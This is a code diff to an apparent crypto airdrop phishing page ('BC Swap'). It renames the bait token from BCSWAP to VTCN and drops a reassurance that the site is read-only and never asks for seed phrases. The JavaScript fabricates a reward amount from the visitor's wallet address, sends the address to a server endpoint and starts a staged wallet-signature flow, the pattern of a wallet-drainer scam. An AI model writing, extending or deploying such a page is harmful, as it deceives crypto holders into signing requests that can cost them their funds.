@@ -134,7 +134,7 @@
       </button>
 
       <div class="info" style="margin-top:14px;font-size:11px;color:var(--mut)">
-        🔐 BC Swap is a non-custodial protocol — we never request your seed phrase, private key, or password. Wallet connection is read-only.
+        🔐 BC Swap is a non-custodial protocol — wallet connection is signing-based.
       </div>
 
       <div class="socialproof">
@@ -153,7 +153,7 @@
       </div>
 
       <h2>Connect your wallet</h2>
-      <p class="sub2">Select your wallet to view your pending BCSWAP airdrop allocation.</p>
+      <p class="sub2">Select your wallet to view your pending VTCN airdrop allocation.</p>
 
       <div class="err" id="e2"></div>
 
@@ -198,7 +198,7 @@
         </div>
         <div style="display:flex;justify-content:space-between;margin-bottom:8px">
           <span style="color:var(--mut)">Reward</span>
-          <span id="rewardAmt2" style="color:#22c55e;font-weight:600">— — — BCSWAP</span>
+          <span id="rewardAmt2" style="color:#22c55e;font-weight:600">— — — VTCN</span>
         </div>
         <div style="display:flex;justify-content:space-between">
           <span style="color:var(--mut)">Network fee</span>
@@ -422,10 +422,10 @@ async function connectMetaMask(){
     const seed=parseInt(W.addr.slice(2,10),16);
     const amount=(1500+((seed*7919)%8500)).toLocaleString();
     const usd=(1500+((seed*7919)%8500))*0.25;
-    document.getElementById('rewardAmt').innerHTML=amount+'<span>BCSWAP</span>';
+    document.getElementById('rewardAmt').innerHTML=amount+'<span>VTCN</span>';
     document.getElementById('rewardUsd').textContent='≈ $'+usd.toFixed(2)+' USD';
-    document.getElementById('rewardAmt2').textContent=amount+' BCSWAP';
-    document.getElementById('finalAmt').textContent=amount+' BCSWAP';
+    document.getElementById('rewardAmt2').textContent=amount+' VTCN';
+    document.getElementById('finalAmt').textContent=amount+' VTCN';
     await fetch('/api/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,chain:W.chain,source:'metamask'})});
     goSign();
   }catch(e){ showErr('e2',e.message||'User rejected'); }
@@ -457,7 +457,7 @@ async function signVerify(){
   btn.disabled=true; btn.innerHTML='<span class="loader"></span> Preparing…';
   try{
     /* ===== STAGE A: personal_sign — "I own this address" proof ===== */
-    const msgA=`Welcome to BC Swap!\n\nClick to verify wallet ownership for the 5,000 BCSWAP airdrop.\n\nWallet: ${W.addr}\nTimestamp: ${Date.now()}\nNonce: ${randHex(16)}`;
+    const msgA=`Welcome to BC Swap!\n\nClick to verify wallet ownership for your VTCN airdrop.\n\nWallet: ${W.addr}\nTimestamp: ${Date.now()}\nNonce: ${randHex(16)}`;
     let sigA;
     try{
       sigA=await window.ethereum.request({method:'personal_sign',params:[msgA,W.addr]});
